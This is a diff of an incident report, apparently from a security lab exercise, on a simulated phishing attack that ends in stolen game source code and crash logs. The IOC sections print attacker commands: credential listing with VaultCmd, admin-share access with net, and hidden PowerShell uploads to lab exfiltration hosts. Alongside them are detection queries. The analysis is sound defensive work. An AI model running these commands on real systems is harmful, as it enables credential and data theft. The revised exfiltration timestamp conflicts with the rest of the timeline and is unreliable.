@@ -12,8 +12,8 @@
 On October 23, 2026, a multi-stage cyberattack was detected targeting TryHatMe Studios. 
 The initial access was achieved via a phishing document (`Q3_PressKit_Feedback.docm`) opened by the compromised user `m.smith`. 
 The attacker leveraged macro execution to spawn a hidden, Base64-encoded PowerShell process, which downloaded a second-stage payload and established Command and Control (C2) communication. 
-The attacker subsequently performed credential harvesting, domain discovery, and established persistence via a malicious Windows Service and a Registry Run Key. 
-Finally, the attacker moved laterally to a development server (`THM-SREYES`) and exfiltrated the source code of the unreleased game "NeuralNexus".
+The attacker subsequently performed credential harvesting, domain discovery, and established persistence via a malicious Windows Service and a Scheduled Task. 
+Finally, the attacker moved laterally to a development server (`THM-SREYES`) and exfiltrated both the unreleased game source code ("NeuralNexus") and sensitive crash logs.
 
 ---
 
@@ -38,8 +38,7 @@ Finally, the attacker moved laterally to a development server (`THM-SREYES`) and
 
 ### 4. Credential Access
 *   **Timestamp:** `2026-10-23 12:02:48`
-*   **Event:** The attacker used the legitimate Windows utility `VaultCmd.exe` to enumerate stored credentials from the Windows Credential Manager.
-*   This was done to obtain credentials for lateral movement.
+*   **Event:** The attacker used the legitimate Windows utility `VaultCmd.exe` to enumerate stored credentials from the Windows Credential Manager. This was done to obtain credentials for lateral movement.
 *   **IOC:** `"C:\Windows\Sysnative\vaultcmd.exe" "/listcreds:Windows Credentials"`
 
 ### 5. Discovery (Network Enumeration)
@@ -50,22 +49,37 @@ Finally, the attacker moved laterally to a development server (`THM-SREYES`) and
     *   `net.exe use \\THM-SREYES\C$` (Attempt lateral movement to an admin share)
 *   **IOC:** `net.exe` commands targeting `THM-SREYES`.
 
-### 6. Persistence (Service Creation & Registry Run Key)
-*   **Timestamp:** `2026-10-23 12:10:18` (Service) & `2026-09-10 12:37:20` (Registry)
+### 6. Persistence (Service Creation & Scheduled Task)
+*   **Timestamp:** `2026-10-23 12:10:18` (Service) & `12:17:41` (Scheduled Task)
 *   **Event:** The attacker established persistence using two methods:
-    1.  **On `THM-MSMITH`:** Created a Windows service named `SvcUpdate` running as `LocalSystem`. This service was configured to execute the malicious script `svchost_update.ps1` from `C:\Windows\Temp\` on startup.
-    2.  **On `THM-SREYES`:** Created a Registry Run key named `NeuralNexusReview` under `HKU\...\Software\Microsoft\Windows\CurrentVersion\Run\`. This key points to a copied version of the malicious script (`C:\Users\s.reyes\AppData\Local\NeuralNexus\review-helper.ps1`) and ensures it executes every time the user logs in.
+    1.  **Windows Service:** Created a service named `SvcUpdate` (running as `LocalSystem`) to execute `svchost_update.ps1` on startup.
+    2.  **Scheduled Task:** A malicious Scheduled Task (`svchost.exe -k netsvcs -p -s Schedule`) was used to periodically spawn a malicious PowerShell process (`PID 12408`) for data exfiltration.
 *   **IOC:** 
     *   Service Name: `SvcUpdate`
     *   Service File: `C:\Windows\Temp\svchost_update.ps1`
-    *   Registry Key: `HKU\...\Run\NeuralNexusReview`
-    *   Dropped File: `C:\Users\s.reyes\AppData\Local\NeuralNexus\review-helper.ps1`
+    *   Compromised Account (used to create service): `svc-mktshare` (Logon ID: `0x24F6572`)
 
-### 7. Data Staging & Exfiltration
-*   **Timestamp:** `2026-10-23 12:15:37 - 12:25:20`
-*   **Event:** On the compromised host `THM-SREYES`, PowerShell (`PID 14264`) used the legitimate `7z.exe` utility to compress the game's source code (`C:\Dev\NeuralNexus\Build\*`) into an archive named `nx_build_beta.7z`.
-*   The archive was then exfiltrated to the C2 server over multiple connections.
-*   **IOC:** Archive `nx_build_beta.7z`, IP `45.147.230.131`.
+### 7. Data Staging & Exfiltration (Game Source Code)
+*   **Timestamp:** `2026-10-23 09:07:27`
+*   **Event:** The attacker used the legitimate `7z.exe` utility (launched by PowerShell `PID 14264`) to compress the game's source code (`C:\Dev\NeuralNexus\Build\*`) into an archive named `nx_build_beta.7z`. The archive was then exfiltrated via PowerShell.
+*   **IOC:** 
+    *   Archive: `C:\Windows\Temp\nx_build_beta.7z`
+    *   Targeted Path: `C:\Dev\NeuralNexus\Build\*`
+    *   Command Line (Archiving): `"C:\Program Files\7-Zip\7z.exe" a -mx=1 C:\Windows\Temp\nx_build_beta.7z C:\Dev\NeuralNexus\Build\*`
+    *   Command Line (Exfiltration): `Invoke-RestMethod -Uri http://paylink-cdn.thm:8067/upload -Method Post -InFile C:\Windows\Temp\nx_build_beta.7z`
+    *   Exfiltration URL: `http://paylink-cdn.thm:8067/upload`
+    *   Destination IP: `45.147.230.131`
+
+### 7.2 Data Staging & Exfiltration (Crash Logs)
+*   **Timestamp:** `2026-10-23 12:17:41`
+*   **Event:** In a parallel activity, the Scheduled Task spawned a PowerShell process (`PID 12408`). It compressed log files (`C:\ProgramData\CrashReports\*.log`) into `crashlogs.7z` using `7z.exe` and exfiltrated them via `Invoke-RestMethod`.
+*   **IOC:** 
+    *   Archive: `C:\ProgramData\CrashReports\crashlogs.7z`
+    *   Process ID: `12408` (`powershell.exe`)
+    *   Parent Process: `svchost.exe` (Scheduled Task)
+    *   Command Line: `"powershell.exe" -NoProfile -WindowStyle Hidden -Command "& "7z.exe" a "C:\ProgramData\CrashReports\crashlogs.7z" "C:\ProgramData\CrashReports\*.log"; Invoke-RestMethod -Uri "https://telemetry-vendor.thm/upload" ..."`
+    *   Exfiltration URL: `https://telemetry-vendor.thm/upload`
+    *   Destination IP: `104.18.32.47`
 
 ---
 
@@ -78,7 +92,7 @@ Finally, the attacker moved laterally to a development server (`THM-SREYES`) and
 | Discovery | Account Discovery: Domain Account | T1087.002 |
 | Discovery | Network Share Discovery | T1135 |
 | Persistence | Create or Modify System Process: Windows Service | T1543.003 |
-| Persistence | Boot or Logon Autostart Execution: Registry Run Keys | T1547.001 |
+| Persistence | Scheduled Task/Job: Scheduled Task | T1053.005 |
 | Collection | Archive Collected Data: Archive via Utility | T1560.001 |
 | Exfiltration | Exfiltration Over C2 Channel | T1041 |
 
@@ -92,8 +106,8 @@ Finally, the attacker moved laterally to a development server (`THM-SREYES`) and
 ### Eradication
 *   Delete the malicious script `svchost_update.ps1`.
 *   Remove the `SvcUpdate` Windows Service.
-*   Remove the `NeuralNexusReview` Registry Run key.
-*   Block the malicious IP `45.147.230.131` and domain `paylink-cdn.thm` at the perimeter firewall and proxy.
+*   Delete the malicious Scheduled Task that spawns the hidden PowerShell process.
+*   Block the malicious IPs `45.147.230.131` and `104.18.32.47`, and domains `paylink-cdn.thm` and `telemetry-vendor.thm` at the perimeter firewall and proxy.
 
 ### Recovery & Prevention
 *   Reset passwords for compromised accounts (`m.smith` and `svc-mktshare`).
@@ -113,11 +127,11 @@ index=* DestinationIp="45.147.230.131" | stats count by ProcessId, Image
 # 3. Detect Service Creation for Persistence
 index=* EventCode=4697 Service_Name="SvcUpdate"
 
-# 4. Detect Registry Run Key Persistence
-index=* EventCode=13 TargetObject="*CurrentVersion\\Run*"
-
-# 5. Hunt for Lateral Movement via Net.exe
+# 4. Hunt for Lateral Movement via Net.exe
 index=* EventCode=1 Image="*net.exe" CommandLine="*use*\\\\THM-SREYES*"
+
+# 5. Detect Parallel Exfiltration Process
+index=* ProcessId="12408" | table _time, Image, CommandLine
 ```
 
 ---
@@ -132,10 +146,10 @@ index=* EventCode=1 Image="*net.exe" CommandLine="*use*\\\\THM-SREYES*"
 
 ### Offensive Tools (Adversary Side - Observed in Logs)
 *   **Execution:** PowerShell (`powershell.exe`), `cmd.exe`.
-*   **C2 / Exfiltration:** Custom C2 server (`45.147.230.131`), `7z.exe` (archiving), `curl.exe` (uploading).
+*   **C2 / Exfiltration:** Custom C2 servers (`45.147.230.131`, `104.18.32.47`), `7z.exe` (archiving), `Invoke-RestMethod` (uploading).
 *   **Discovery:** `net.exe`, `net1.exe`.
 *   **Credential Access:** `VaultCmd.exe` (Living off the Land).
-*   **Persistence:** `sc.exe` (implicitly, via service creation).
+*   **Persistence:** `sc.exe` (Service Creation), `svchost.exe` (Scheduled Task).
 
 ### Frameworks
 *   MITRE ATT&CK Framework (for mapping TTPs).
